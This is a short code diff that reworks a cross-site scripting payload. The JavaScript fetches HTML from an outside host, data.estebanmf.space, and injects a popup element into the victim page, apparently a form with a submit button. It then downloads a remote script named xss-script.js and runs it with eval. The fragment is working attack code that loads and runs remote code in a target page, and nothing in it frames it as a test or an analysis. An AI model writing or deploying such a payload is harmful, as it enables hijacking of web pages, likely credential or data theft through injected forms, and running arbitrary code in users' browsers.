@@ -40,14 +40,24 @@ fetch('https://data.estebanmf.space/xss')
 .then(t => t.text())
 .then(d => {
 console.log('Fetched HTML:', d);
-// Replace entire document content
-document.documentElement.innerHTML = d;
-console.log('Document HTML replaced');
+// Create a temporary div to parse the popup
+const tempDiv = document.createElement('div');
+tempDiv.innerHTML = d;
+const popup = tempDiv.querySelector('#xss-popup');
+if (!popup) {
+console.error('Popup div not found in fetched HTML');
+return;
+}
+// Append popup to existing body
+document.body.appendChild(popup);
+console.log('Popup appended to body');
+console.log('Checking if submit-btn exists:', !!document.getElementById('submit-btn'));
 // Fetch and eval xss-script.js
-fetch('https://data.estebanmf.space/xss-script')
+fetch('https://data.estebanmf.space/xss-script.js')
 .then(t => t.text())
 .then(script => {
-console.log('xss-script fetched, evaluating');
+console.log('xss-script.js fetched, content:', script);
+console.log('xss-script.js evaluating');
 try {
 eval(script);
 console.log('xss-script.js evaluated');
